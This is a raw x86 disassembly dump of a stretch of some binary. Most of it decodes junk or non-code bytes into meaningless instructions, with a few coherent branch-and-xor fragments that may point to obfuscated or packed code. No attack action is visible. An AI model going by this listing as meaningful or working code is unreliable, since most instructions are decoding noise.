  40209b:	cmp    al,0x46
  40209d:	ins    DWORD PTR es:[edi],dx
  40209e:	cmp    cl,BYTE PTR [eax+0x73]
  4020a1:	jge    0x402118
  4020a3:	sub    bl,dh
  4020a5:	pop    edx
  4020a6:	sbb    al,0xc3
  4020a8:	xchg   BYTE PTR ds:0xdd2247a0,dh
  4020ae:	push   edx
  4020af:	adc    eax,DWORD PTR [esi]
  4020b1:	sbb    esp,ebp
  4020b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020b4:	hlt    
  4020b5:	mov    al,0x94
  4020b7:	or     al,0x22
  4020b9:	fidivr DWORD PTR [eax]
  4020bb:	sub    al,0xb
  4020bd:	jp     0x4020e4
  4020bf:	mul    DWORD PTR [esi+0x78d05299]
  4020c5:	rcl    BYTE PTR [edx],cl
  4020c7:	inc    edx
  4020c8:	sbb    BYTE PTR [ebp+0x6c71a227],0x9a
  4020cf:	mov    ebp,0xf522fa32
  4020d4:	mov    eax,ds:0xbad14e32
  4020d9:	stc    
  4020da:	sub    al,0x26
  4020dc:	push   ebx
  4020dd:	loopne 0x402122
  4020df:	jmp    0x49a7:0x6cb35aa1
  4020e6:	mov    bl,0x77
  4020e8:	hlt    
  4020e9:	push   ds
  4020ea:	pop    ecx
  4020eb:	das    
  4020ec:	xchg   ecx,eax
  4020ed:	bound  ebp,QWORD PTR [esi-0x21]
  4020f0:	inc    eax
  4020f1:	inc    edx
  4020f2:	icebp  
  4020f3:	lock in al,dx
  4020f5:	and    al,0x7c
  4020f7:	leave  
  4020f8:	cdq    
  4020f9:	xor    bl,BYTE PTR [ebp-0x529c1c2c]
  4020ff:	mov    DWORD PTR [eax],ebp
  402101:	xlat   BYTE PTR ds:[ebx]
  402102:	mov    ch,0x5a
  402104:	xchg   ebx,eax
  402105:	jbe    0x40211a
  402107:	pop    ecx
  402108:	mov    ebx,0xb64bf83e
  40210d:	sar    ebp,0xe1
  402110:	daa    
  402111:	ret    
  402112:	xchg   ebx,eax
  402113:	jb     0x40211c
  402115:	imul   edx,DWORD PTR [eax*4+0x40d52e29],0xffffffa3
  40211d:	jbe    0x402187
  40211f:	cmp    eax,0xce001f26
  402124:	adc    al,0x2c
  402126:	imul   ebp,DWORD PTR [esi-0x54],0x4b4d027b
  40212d:	mov    al,0xcf
  40212f:	mov    esp,0x2913956
  402134:	ss jbe 0x402195
  402137:	ds push ebp
  402139:	jge    0x4020f9
  40213b:	mov    ds:0x9ab952d5,eax
  402140:	cmp    BYTE PTR [ecx+0x38],ch
  402143:	push   0x56bccfa0
  402148:	pop    es
  402149:	lods   eax,DWORD PTR ds:[esi]
  40214a:	push   es
  40214b:	xchg   ebx,eax
  40214c:	or     al,0x2e
  40214e:	inc    ebx
  40214f:	dec    eax
  402150:	test   al,0x51
  402152:	shl    BYTE PTR [esi+0x63],cl
  402155:	sbb    BYTE PTR [eax-0x6c],ah
  402158:	add    al,0x91
  40215a:	mov    DWORD PTR [esi],eax
  40215c:	sub    esi,ecx
  40215e:	mov    esi,0x9ff41d26
  402163:	out    0x71,eax
  402165:	sbb    eax,0xa772b4c5
  40216a:	inc    ebp
  40216b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40216c:	jle    0x4021ad
  40216e:	mov    WORD PTR [ebx+0x37ee28d4],gs
  402174:	xchg   ebp,eax
  402175:	xor    ebp,edx
  402177:	push   ds
  402178:	hlt    
  402179:	sbb    DWORD PTR [ebp-0x75],ebp
  40217c:	es xchg ecx,eax
  40217e:	gs in  eax,dx
  402180:	ds push esp
  402182:	xor    bh,ch
  402184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402185:	inc    ecx
  402186:	test   al,0xa2
  402188:	ss (bad) 
  40218a:	pop    edi
  40218b:	fisubr DWORD PTR [edi+0x69ad5e12]
  402191:	imul   DWORD PTR [edi+0x1dddd092]
  402197:	aad    0xeb
  402199:	mov    ch,0x7d
  40219b:	cs jbe 0x40220c
  40219e:	sub    bl,BYTE PTR es:[edx]
  4021a1:	in     eax,dx
  4021a2:	sub    eax,0xe2d69a20
  4021a7:	sub    DWORD PTR [edi+0x31ebf2e],0xa8ebfc3
  4021b1:	mov    ?,edx
  4021b3:	pushw  cs
  4021b5:	fnstenv [eax+0x8b555af]
  4021bb:	sub    DWORD PTR [ebx-0x57288b5f],ebp
  4021c1:	push   edx
  4021c2:	cli    
  4021c3:	pop    ds
  4021c4:	mov    eax,ds:0xfe6ddaed
  4021c9:	scas   eax,DWORD PTR es:[edi]
  4021ca:	popa   
  4021cb:	cmp    al,0x54
  4021cd:	and    eax,0x6011561
  4021d2:	or     al,BYTE PTR [ebx+0x33]
  4021d5:	and    ch,BYTE PTR [edi+edi*4-0x5b]
  4021d9:	ret    0xe381
  4021dc:	mov    eax,ds:0x57ca705f
  4021e1:	cmp    eax,0x9bcbd1a2
  4021e6:	mov    al,ds:0x246deb13
  4021eb:	test   eax,0x699e5e95
  4021f0:	mov    ah,0x47
  4021f2:	mov    edx,0x7e04f891
  4021f7:	xor    al,0xf
  4021f9:	retf   
  4021fa:	mov    ch,0x81
  4021fc:	mov    ds:0x50420732,al
  402201:	inc    esi
  402202:	(bad)  
  402203:	call   DWORD PTR [eax+0x29]
  402206:	icebp  
  402207:	adc    DWORD PTR [esi],eax
  402209:	sbb    esi,edx
  40220b:	cmp    BYTE PTR [ebx-0x77dc17f8],bl
  402211:	popa   
  402212:	sbb    BYTE PTR [ecx-0x2e],dh
  402215:	psubsw mm2,QWORD PTR [edx+0x63caad4a]
  40221c:	fdivr  st,st(1)
  40221e:	icebp  
  40221f:	mov    ch,0xaf
  402221:	jge    0x4021d9
  402223:	jmp    0x1355:0x94ca05c1
  40222a:	scas   eax,DWORD PTR es:[edi]
  40222b:	mov    bh,0x57
  40222d:	pop    es
  40222e:	xor    eax,0xdfe836c6
  402233:	call   0xc992:0xe12d325c
  40223a:	iret   
  40223b:	push   ss
  40223c:	repz push eax
  40223e:	push   es
  40223f:	aad    0x9
  402241:	cmp    ebx,DWORD PTR [esi+edi*4-0x5a]
  402245:	out    dx,al
  402246:	test   eax,0xfe56493e
  40224b:	into   
  40224c:	lods   eax,DWORD PTR ds:[esi]
  40224d:	xchg   esp,eax
  40224e:	and    ebx,DWORD PTR [edi-0x5778625e]
  402254:	pop    ebx
  402255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402256:	jbe    0x402258
  402258:	and    BYTE PTR [esi+0x3b73f5c8],bl
  40225e:	das    
  40225f:	ret    0xf883
  402262:	xchg   edx,eax
  402263:	jns    0x402255
  402265:	xchg   edx,eax
  402266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402267:	xor    BYTE PTR [esi],al
  402269:	xchg   ecx,eax
  40226a:	call   DWORD PTR [edx+ebp*4]
  40226d:	pop    ebp
  40226e:	scas   eax,DWORD PTR es:[edi]
  40226f:	(bad)  
  402270:	mov    bh,0x18
  402272:	pushf  
  402273:	ret    0xe24e
  402276:	inc    eax
  402277:	jbe    0x4022eb
  402279:	out    0xd1,eax
  40227b:	pop    esi
  40227c:	aaa    
  40227d:	xchg   ebp,eax
  40227e:	add    ch,bh
  402280:	xor    DWORD PTR [edi-0x43],eax
  402283:	lds    ecx,FWORD PTR [ecx-0x35]
  402286:	(bad)  
  402287:	xor    BYTE PTR [edx],ah
  402289:	adc    BYTE PTR [edx],0xd0
  40228c:	jp     0x4022c2
  40228e:	xchg   esp,eax
  40228f:	inc    esp
  402290:	add    al,0x40
  402292:	jb     0x4022fd
  402294:	mov    eax,0x31ee2931
  402299:	iret   
  40229a:	rcl    DWORD PTR [esi],1
  40229c:	xor    DWORD PTR [edi],0xce4e1c72
  4022a2:	nop
  4022a3:	shr    DWORD PTR [esi],0x33
  4022a6:	mov    BYTE PTR [ecx+0x42a77125],0x0
  4022ad:	mov    ch,0xa7
  4022af:	inc    edx
  4022b0:	add    BYTE PTR [ebx],al
  4022b2:	(bad)  
  4022b3:	cmp    DWORD PTR [ecx],eax
  4022b5:	jne    0x402dc8
  4022bb:	mov    eax,DWORD PTR [ebp+0x8]
  4022be:	mov    ecx,DWORD PTR [ebp-0x18]
  4022c1:	sbb    DWORD PTR ds:0x42a835,0x2700
  4022cb:	xor    eax,esi
  4022cd:	add    eax,edi
  4022cf:	jmp    0x40256e
  4022d4:	xlat   BYTE PTR ds:[ebx]
  4022d5:	cmp    eax,0xd9d5d1c7
  4022da:	fxch   st(1)
  4022dc:	mov    edi,0xc5682c5b
  4022e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022e2:	cmp    BYTE PTR ds:0x78780904,0xfe
  4022e9:	jle    0x402363
  4022eb:	js     0x402341
  4022ed:	push   es
  4022ee:	pushf  
  4022ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022f0:	out    dx,al
  4022f1:	mov    cl,0x3f
  4022f3:	out    0x29,eax
  4022f5:	xchg   ebx,eax
  4022f6:	loop   0x4022e4
  4022f8:	js     0x4022c3
  4022fa:	in     al,dx
  4022fb:	inc    ebx
  4022fc:	inc    edx
  4022fd:	push   esp
  4022fe:	push   ebp
  4022ff:	lock (bad) 
  402301:	cmp    al,0xeb
  402303:	ja     0x402304
  402305:	push   edx
  402306:	push   esp
  402307:	mov    ah,cl
  402309:	jns    0x40230e
  40230b:	sbb    al,0x52
  40230d:	jle    0x40238a
  40230f:	mov    ebp,0xa58bacc4
  402314:	js     0x40230f
  402316:	iret   
  402317:	dec    edi
  402318:	add    ch,BYTE PTR [edi-0x24d821fb]
  40231e:	adc    dl,BYTE PTR [edi+0x7f]
  402321:	sub    eax,0x1990f852
  402326:	inc    esp
  402327:	ror    DWORD PTR [edi+edx*4+0x23e12479],1
  40232e:	push   esp
  40232f:	cdq    
  402330:	mov    esi,es
  402332:	xor    DWORD PTR [ecx+0x7b],ebp
  402335:	xchg   esp,eax
  402336:	sbb    al,0x19
  402338:	cmp    eax,0xf9cb660f
  40233d:	call   0xc0340a3c
  402342:	inc    ecx
  402343:	leave  
  402344:	in     al,dx
  402345:	fsubr  DWORD PTR [ecx+ebx*8-0x77]
  402349:	in     al,dx
  40234a:	fadd   DWORD PTR [ecx+0x5a]
  40234d:	sbb    eax,0x1f991ed5
  402352:	jo     0x40238d
  402354:	inc    esi
  402355:	imul   eax,ecx,0x4dca381a
  40235b:	in     al,0xc0
  40235d:	pop    ebp
  40235e:	mov    ah,0xa8
  402360:	jmp    0x35cccdfa
  402365:	cmp    al,BYTE PTR [edi-0xb]
  402368:	pop    ecx
  402369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40236a:	aaa    
  40236b:	fsubrp st(5),st
  40236d:	mov    dl,0x7d
  40236f:	cld    
  402370:	jg     0x4022f8
  402372:	pop    ebx
  402373:	out    0x2e,al
  402375:	js     0x4023b1
  402377:	jne    0x4023b8
  402379:	xor    DWORD PTR [eax-0x3528659e],esi
  40237f:	sahf   
  402380:	pop    esp
  402381:	pop    ds
  402382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402383:	repz mov ax,0xdb42
  402388:	std    
  402389:	sub    edx,ebp
  40238b:	push   0x38
  40238d:	in     eax,dx
  40238e:	gs jne 0x4023e9
  402391:	cmp    ebp,DWORD PTR [ecx-0x6a]
  402394:	push   ecx
  402395:	sbb    bh,BYTE PTR [ecx]
  402397:	pop    esp
  402398:	adc    DWORD PTR [ebp+0x7d],ecx
  40239b:	nop
  40239c:	jb     0x4023cc
  40239e:	push   es
  40239f:	stos   DWORD PTR es:[edi],eax
  4023a0:	in     al,0xe6
  4023a2:	es mov ebx,0x6a26102c
  4023a8:	(bad)  
  4023aa:	jmp    0x40232c
  4023ac:	data16 adc al,0xea
  4023af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023b0:	(bad)  
  4023b1:	lods   al,BYTE PTR ds:[esi]
  4023b2:	retf   
  4023b3:	push   ss
  4023b4:	jmp    0x4023bb
  4023b6:	dec    esi
  4023b7:	lods   al,BYTE PTR ds:[esi]
  4023b8:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4023ba:	mov    ecx,0xa2689fd5
  4023bf:	xchg   edi,eax
  4023c0:	popf   
  4023c1:	mov    cs,WORD PTR [esi-0x1df3f1f3]
  4023c7:	pop    ss
  4023c8:	repz in ax,0x2d
  4023cc:	push   cs
  4023cd:	fstp   st(7)
  4023cf:	sbb    cl,ah
  4023d1:	nop
  4023d2:	(bad)  
  4023d3:	xlat   BYTE PTR ds:[ebx]
  4023d4:	popa   
  4023d5:	shl    DWORD PTR [eax-0x3d],cl
  4023d8:	push   ss
  4023d9:	cmp    ecx,DWORD PTR [esi-0x74649cdd]
  4023df:	sti    
  4023e0:	fimul  WORD PTR [eax+0x4]
  4023e3:	ret    0xe65b
  4023e6:	cmp    DWORD PTR [eax],eax
  4023e8:	push   ds
  4023e9:	fimul  DWORD PTR [edx+ecx*1]
  4023ec:	(bad)  
  4023ee:	mov    edx,0x4e622d76
  4023f3:	sub    al,0x52
  4023f5:	ins    DWORD PTR es:[edi],dx
  4023f6:	rcr    BYTE PTR [ecx-0x7e],1
  4023f9:	mov    ebp,DWORD PTR [ebp+eiz*8+0x4]
  4023fd:	and    BYTE PTR [edi+0x75],cl
  402400:	(bad)  
  402402:	jmp    0xcaaf:0x2b57e423
  402409:	inc    ebp
  40240a:	jle    0x4023d7
  40240c:	mov    ah,0x2a
  40240e:	popf   
  40240f:	cs xchg ebx,eax
  402411:	inc    eax
  402412:	pop    ebx
  402413:	xor    dh,BYTE PTR [ebp+0x407dbced]
  402419:	fistp  WORD PTR ds:0x57cca362
  40241f:	in     al,0x64
  402421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402422:	scas   eax,DWORD PTR es:[edi]
  402423:	xor    edx,DWORD PTR [ecx+esi*2-0x68]
  402427:	in     al,dx
  402428:	sbb    edi,DWORD PTR [esi]
  40242a:	or     al,0x94
  40242c:	stos   DWORD PTR es:[edi],eax
  40242d:	sub    BYTE PTR [eax],0xb9
  402430:	out    0x73,eax
  402432:	ret    0x8f59
  402435:	pop    edi
  402436:	clc    
  402437:	mov    edx,0x62231f15
  40243c:	fwait
  40243d:	arpl   WORD PTR [esi],sp
  40243f:	jae    0x40241a
  402441:	push   ds
  402442:	rol    DWORD PTR [edi+0x3216b85c],0xaa
  402449:	or     al,0x6b
  40244b:	jg     0x402421
  40244d:	int    0x8e
  40244f:	inc    edi
  402450:	mov    ds:0x60b08160,al
  402455:	cmp    esi,esi
  402457:	in     al,dx
  402458:	imul   esp,DWORD PTR [edi],0xe287d373
  40245e:	je     0x402425
  402460:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  402462:	stos   BYTE PTR es:[di],al
  402464:	inc    edi
  402465:	jno    0x4024d7
  402467:	or     ch,BYTE PTR [eax-0x51]
  40246a:	and    eax,0x430deb79
  402470:	fild   WORD PTR [ecx+0x2e4efbbe]
  402476:	fwait
  402477:	gs push 0x24
  40247a:	out    dx,al
  40247b:	loop   0x402488
  40247d:	push   edi
  40247e:	mov    edi,DWORD PTR [ecx+0x4dce992f]
  402484:	test   al,0xe1
  402486:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402488:	stc    
  402489:	in     al,0x3b
  40248b:	iret   
  40248c:	fstp   TBYTE PTR [ecx-0xb]
  40248f:	inc    esi
  402490:	jmp    0x6a05d69c
  402495:	cmp    edx,DWORD PTR [eax-0x230d785e]
  40249b:	pop    eax
  40249c:	jne    0x402474
  40249e:	in     eax,dx
  40249f:	daa    
  4024a0:	xor    eax,0x995a68c1
  4024a5:	xor    al,0x6e
  4024a7:	rcl    BYTE PTR [edi],0x6
  4024aa:	test   ebx,0x39798efb
  4024b0:	bound  edx,QWORD PTR [edi+0x44]
  4024b3:	ins    BYTE PTR es:[edi],dx
  4024b4:	out    0x26,eax
  4024b6:	fcmovnb st,st(6)
  4024b8:	popf   
  4024b9:	ret    
  4024ba:	cmc    
  4024bb:	outs   dx,BYTE PTR ds:[esi]
  4024bd:	mov    BYTE PTR [ecx],dh
  4024bf:	repz jb 0x402525
  4024c2:	mov    al,0xdb
  4024c4:	in     eax,dx
  4024c5:	xchg   BYTE PTR ds:0xd6c66661,bl
  4024cb:	(bad)  
  4024cc:	pop    eax
  4024cd:	les    ebx,FWORD PTR [esi]
  4024cf:	idiv   DWORD PTR [edi+0xdeddb03]
  4024d5:	call   0x536b:0xd96df1d2
  4024dc:	in     al,dx
  4024dd:	jecxz  0x402522
  4024df:	cmp    eax,0xceae9f64
  4024e4:	mov    DWORD PTR [ecx],esp
  4024e6:	dec    edx
  4024e7:	push   edx
  4024e8:	rol    BYTE PTR [edi-0x5a],1
  4024eb:	push   es
  4024ec:	daa    
  4024ed:	(bad)  
  4024ee:	mov    ch,0x8
  4024f0:	pop    edi
  4024f1:	hlt    
  4024f2:	or     al,0xc3
  4024f4:	inc    ebp
  4024f5:	push   cs
  4024f6:	icebp  
  4024f7:	sbb    al,BYTE PTR [esi-0x4b5d295e]
  4024fd:	outs   dx,DWORD PTR ds:[esi]
  4024fe:	sbb    edi,esi
  402500:	int3   
  402501:	or     eax,0x9a5be6d1
  402506:	rcl    DWORD PTR [esi],1
  402508:	xor    BYTE PTR [ecx-0x1efc7f22],bh
  40250e:	cdq    
  40250f:	sbb    DWORD PTR [eax+0x5fa6ff11],ebp
  402515:	push   ecx
  402516:	fiadd  WORD PTR [ebx]
  402518:	in     eax,0x43
  40251a:	sbb    DWORD PTR [ebp+0x51715d9d],esi
  402520:	lds    esi,FWORD PTR [eax-0x328efae4]
  402526:	pop    eax
  402527:	add    eax,0xc7b38f24
  40252c:	adc    BYTE PTR [ecx],0x2e
  40252f:	inc    esi
  402530:	ja     0x402587
  402532:	outs   dx,BYTE PTR ds:[esi]
  402533:	jno    0x402581
  402535:	and    al,0xee
  402537:	inc    esi
  402539:	test   al,0xb8
  40253b:	aas    
  40253c:	pusha  
  40253d:	push   es
  40253e:	push   ds
  40253f:	or     dh,BYTE PTR [edx+ecx*8-0x17]
  402543:	or     al,0xdf
  402545:	pusha  
  402546:	push   ebp
  402547:	in     al,0xe1
  402549:	xchg   ebx,eax
  40254a:	call   0x225fc9f4
  40254f:	in     eax,0x12
  402551:	fsub   QWORD PTR [edi]
  402553:	adc    al,0xd2
  402555:	xchg   edi,eax
  402556:	out    dx,eax
  402557:	in     al,0x5b
  402559:	jp     0x4024dd
  40255b:	or     ebx,DWORD PTR [esi-0x6f]
  40255e:	inc    ecx
  40255f:	mov    BYTE PTR [ebp-0x18],dh
  402562:	mov    bh,0xd1
  402564:	popf   
  402565:	mov    dh,0x5b
  402567:	scas   al,BYTE PTR es:[edi]
  402568:	sub    BYTE PTR [esi-0x1153ec5a],cl
  40256e:	cmp    DWORD PTR [ecx],eax
  402570:	jne    0x402832
  402576:	mov    eax,DWORD PTR [ebp+0x8]
  402579:	mov    ecx,DWORD PTR [ebp-0x10]
  40257c:	xor    eax,esi
  40257e:	add    eax,edi
  402580:	mov    DWORD PTR [ecx],eax
  402582:	jmp    0x402821
  402587:	aas    
  402588:	retf   
  402589:	ret    0xcace
  40258c:	aad    0xd3
  40258e:	fld    DWORD PTR [ecx+eiz*1+0x26]
  402592:	inc    edx
  402593:	jae    0x4025b3
  402595:	add    al,0xe6
  402597:	mov    cl,BYTE PTR [edi]
  402599:	js     0x402613
  40259b:	(bad)  
  40259c:	jle    0x402616
  40259e:	js     0x4025dd
  4025a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025a1:	push   ss
  4025a2:	sbb    dl,bl
  4025a4:	addr16 xchg esi,eax
  4025a6:	lss    esi,FWORD PTR [esi+0x9]
  4025aa:	sbb    DWORD PTR [edi+0x4d],eax
  4025ad:	cs jne 0x402545
  4025b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025b1:	ds out 0xb6,eax
  4025b4:	push   esp
  4025b5:	xor    BYTE PTR [edi+edi*4-0x2a782f79],0xbd
  4025bd:	leave  
  4025be:	sbb    al,0xe9
  4025c0:	push   esi
  4025c1:	repnz xchg ecx,eax
  4025c3:	mov    esp,0x1125b5bc
  4025c8:	mov    ah,0x47
  4025ca:	stos   BYTE PTR es:[edi],al
  4025cb:	cwde   
  4025cc:	push   edx
  4025cd:	xor    edi,ebp
  4025cf:	and    BYTE PTR [edi-0x2a],dh
  4025d2:	aaa    
  4025d3:	add    DWORD PTR [eax+0x14],edx
  4025d6:	out    0x1c,al
  4025d8:	dec    ecx
  4025d9:	xchg   esi,eax
  4025da:	out    0x51,eax
  4025dc:	adc    al,0x0
  4025de:	retf   
  4025df:	rol    DWORD PTR [eax-0x6f],0xdd
  4025e3:	and    eax,0xb79af115
  4025e8:	push   edi
  4025e9:	jp     0x40264f
  4025eb:	je     0x402611
  4025ed:	in     eax,0x8b
  4025ef:	pop    esp
  4025f0:	call   0x5ba9:0x216b197f
  4025f7:	icebp  
  4025f8:	neg    esp
  4025fa:	test   al,0x95
  4025fc:	sbb    DWORD PTR [eax+0x7e],ebx
  4025ff:	rol    eax,0xba
  402602:	push   edx
  402603:	xor    dh,BYTE PTR [eax+ebx*2]
  402606:	and    eax,0xed281fbf
  40260b:	ja     0x40260e
  40260d:	and    ch,0xc9
  402610:	or     DWORD PTR [ecx],ebx
  402612:	call   0x398ffb8c
  402617:	jl     0x4025cd
  402619:	xor    DWORD PTR [eax+0x3d],0x283c8994
  402620:	icebp  
  402621:	inc    edi
  402622:	mov    esi,0x183f10da
  402627:	jnp    0x4025ac
  402629:	int    0xbe
  40262b:	dec    ecx
  40262c:	inc    esp
  40262d:	daa    
  40262e:	xchg   edi,eax
  40262f:	gs push edi
  402631:	scas   eax,DWORD PTR es:[edi]
  402632:	jns    0x402633
  402634:	xlat   BYTE PTR ds:[ebx]
  402635:	dec    ecx
  402636:	push   ebx
  402637:	leave  
  402638:	ffree  st(1)
  40263a:	jmp    0x771f4d32
  40263f:	fwait
  402640:	cmp    eax,0x70ef0da7
  402645:	mov    ah,0xa2
  402647:	sar    ebx,0x18
  40264a:	pop    ecx
  40264b:	push   0xffffffdf
  40264d:	cmp    dl,ah
  40264f:	dec    edi
  402650:	pop    ds
  402651:	push   ss
  402652:	in     al,0x33
  402654:	add    eax,0x610d859
  402659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40265a:	in     eax,0xd7
  40265c:	sub    al,0xac
  40265e:	ins    BYTE PTR es:[edi],dx
  40265f:	iret   
  402660:	pop    ecx
  402661:	or     edi,DWORD PTR [edi]
  402663:	and    bl,BYTE PTR [eax]
  402665:	daa    
  402666:	(bad)  
  402667:	std    
  402668:	in     al,0xeb
  40266a:	je     0x40263c
  40266c:	std    
  40266d:	push   ds
  40266e:	mov    cl,0x31
  402670:	dec    eax
  402671:	push   esi
  402672:	in     al,dx
  402673:	stc    
  402674:	into   
  402675:	push   ds
  402676:	out    dx,al
  402677:	mov    ebx,0x3e0c797e
  40267c:	mov    dl,0x83
  40267e:	mov    DWORD PTR [esp+eax*2],0x6c8e108f
  402685:	loop   0x40265f
  402687:	xchg   esi,eax
  402688:	aad    0x46
  40268a:	std    
  40268b:	inc    edi
  40268c:	stc    
  40268d:	sbb    bh,BYTE PTR [edx+0x1169dd60]
  402693:	test   eax,0xeab075ba
  402698:	jo     0x4026b3
  40269a:	and    DWORD PTR [eax-0x64],ebx
  40269d:	data16 cmc 
  40269f:	and    esp,esp
  4026a1:	mov    BYTE PTR [edi],bh
  4026a3:	push   edi
  4026a4:	push   ebx
  4026a5:	xchg   edx,eax
  4026a6:	mov    ds:0x7ac12115,eax
  4026ab:	test   bl,al
  4026ad:	dec    edx
  4026ae:	mov    bl,0x33
  4026b0:	fmulp  st(4),st
  4026b2:	jbe    0x4026c2
  4026b4:	dec    esi
  4026b5:	push   0xf9691193
  4026ba:	sub    al,0xeb
  4026bc:	das    
  4026bd:	lea    ebp,[ebp-0x3f]
  4026c0:	test   eax,0xd995a2cb
  4026c5:	scas   eax,DWORD PTR es:[edi]
  4026c6:	das    
  4026c7:	push   ds
  4026c8:	mov    al,ds:0x3f82ed13
  4026cd:	inc    eax
  4026ce:	mov    ah,0xdf
  4026d0:	pop    ds
  4026d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026d2:	push   edx
  4026d3:	pop    ss
  4026d4:	sub    bl,BYTE PTR [eax]
  4026d6:	stos   BYTE PTR es:[edi],al
  4026d7:	dec    ebx
  4026d8:	test   al,0x7a
  4026da:	jno    0x402678
  4026dc:	ficomp WORD PTR [edx+0x57]
  4026df:	test   eax,0x7d77e34d
  4026e4:	add    DWORD PTR [esi-0x21ccdb7f],esi
  4026ea:	mov    ch,0x39
  4026ec:	imul   DWORD PTR [edx-0x79]
  4026ef:	shl    BYTE PTR [esi+0x32776234],0xb
  4026f6:	and    BYTE PTR [edi],ch
  4026f8:	jmp    0x91daf155
  4026fd:	je     0x4026d3
  4026ff:	(bad)  
  402700:	jmp    0x9bbd:0x3f73670e
  402707:	(bad)  
  402708:	mov    edi,0xd2bfbcbb
  40270d:	js     0x402761
  40270f:	inc    ebp
  402710:	popf   
  402711:	jo     0x4026ba
  402713:	cmp    DWORD PTR [eax],edx
  402715:	popf   
  402716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402717:	sti    
  402718:	into   
  402719:	add    edx,DWORD PTR [eax]
  40271b:	jne    0x40279c
  40271d:	lea    ebx,[edx]
  40271f:	bound  ebp,QWORD PTR es:[esi]
  402722:	mov    eax,0x8adda8a
  402727:	popa   
  402728:	data16 mov ds:0x8e92f65,al
  40272e:	scas   eax,DWORD PTR es:[edi]
  40272f:	adc    eax,0xf6fe7cb
  402734:	int3   
  402735:	or     ch,dh
  402737:	pop    eax
  402738:	push   ebx
  402739:	sahf   
  40273a:	jmp    0x402769
  40273c:	gs mov esi,0xe5f391bd
  402742:	lea    edx,[edx]
  402744:	jle    0x402752
  402746:	jle    0x402754
  402748:	rcl    dl,1
  40274a:	aas    
  40274b:	ss sti 
  40274d:	ficom  WORD PTR [edx]
  40274f:	add    eax,0x7740a684
  402754:	out    dx,al
  402755:	pushf  
  402756:	or     al,ah
  402758:	jp     0x4027bd
  40275a:	adc    DWORD PTR [esi+0x24f25c02],ebp
  402760:	in     eax,0x1f
  402762:	fldlg2 
  402764:	lahf   
  402765:	cmp    al,0x68
  402767:	cmp    al,0xd6
  402769:	xor    eax,DWORD PTR [ecx-0x2e]
  40276c:	and    DWORD PTR [edx],0xffffffcf
  40276f:	mov    ah,0xcf
  402771:	add    eax,0x930d76a9
  402776:	(bad)  
  402777:	test   al,0xb7
  402779:	push   ds
  40277a:	dec    edi
  40277b:	es ret 
  40277d:	mov    eax,0xa727931e
  402782:	shl    BYTE PTR [edi+0x24859510],1
  402788:	cld    
  402789:	out    dx,al
  40278a:	cmp    ebp,ebx
  40278c:	or     edi,ecx
  40278e:	repnz mov dl,0x67
  402791:	cmp    BYTE PTR [ecx+0x7437ffda],0x30
  402798:	mov    ecx,0xc966a237
  40279d:	cmp    al,0x67
  40279f:	and    al,0x50
  4027a1:	jbe    0x402794
  4027a3:	cmp    ebx,DWORD PTR [edi-0x30d83c39]
  4027a9:	jbe    0x40273a
  4027ab:	add    BYTE PTR [edx],ah
  4027ad:	inc    esi
  4027ae:	jae    0x402793
  4027b0:	xchg   esi,eax
  4027b1:	popf   
  4027b2:	out    0x8a,al
  4027b4:	xor    BYTE PTR [edi+0x725d1b6a],al
  4027ba:	std    
  4027bb:	mov    cl,0xee
  4027bd:	inc    edx
  4027be:	mov    dl,0xa8
  4027c0:	sub    edi,DWORD PTR [edi-0x151d6810]
  4027c6:	pop    edi
  4027c7:	mov    bh,0x98
  4027c9:	mov    esi,0x1d786ca2
  4027ce:	push   0x3e
  4027d0:	add    dl,bh
  4027d2:	mov    ss,edi
  4027d4:	dec    esi
  4027d5:	gs mov bh,0x7
  4027d8:	scas   eax,DWORD PTR es:[edi]
  4027d9:	idiv   BYTE PTR [ecx-0x33]
  4027dc:	in     al,dx
  4027dd:	lea    esp,[esi-0x55]
  4027e0:	inc    BYTE PTR [ebx-0x7ae4adc0]
  4027e6:	pop    ebp
  4027e7:	jl     0x40278f
  4027e9:	and    eax,0x241215b7
  4027ee:	rol    DWORD PTR [ecx],cl
  4027f0:	adc    eax,0xe7f84dc6
  4027f5:	inc    ecx
  4027f6:	add    DWORD PTR [eax],edx
  4027f8:	retf   
  4027f9:	sbb    dh,0xd5
  4027fc:	nop
  4027fd:	aad    0x27
  4027ff:	mov    ebp,0x66af0d3c
  402804:	std    
  402805:	mov    BYTE PTR [ebx],dh
  402807:	fsub   st(3),st
  402809:	add    eax,0xe154dbb
  40280e:	test   eax,0x87715e2f
  402813:	jb     0x402877
  402815:	add    al,0x49
  402817:	adc    DWORD PTR [eax],eax
  402819:	pop    ss
  40281a:	out    dx,eax
  40281b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40281c:	cmp    al,0xfe
  40281e:	dec    esp
  40281f:	or     bh,cl
  402821:	mov    eax,DWORD PTR [ebp-0x10]
  402824:	mov    ecx,DWORD PTR [ebp+0x10]
  402827:	xor    ecx,esi
  402829:	mov    edx,0xffcd8d68
  40282e:	sub    edx,ecx
  402830:	add    DWORD PTR [eax],edx
  402832:	mov    eax,ds:0x41ebba
  402837:	mov    eax,DWORD PTR [eax]
  402839:	mov    cx,WORD PTR [ebp-0x4]
  40283d:	movzx  ecx,cx
  402840:	add    ecx,DWORD PTR [eax]
  402842:	mov    DWORD PTR [ebp-0x18],ecx
  402845:	mov    eax,DWORD PTR [ebp+0xc]
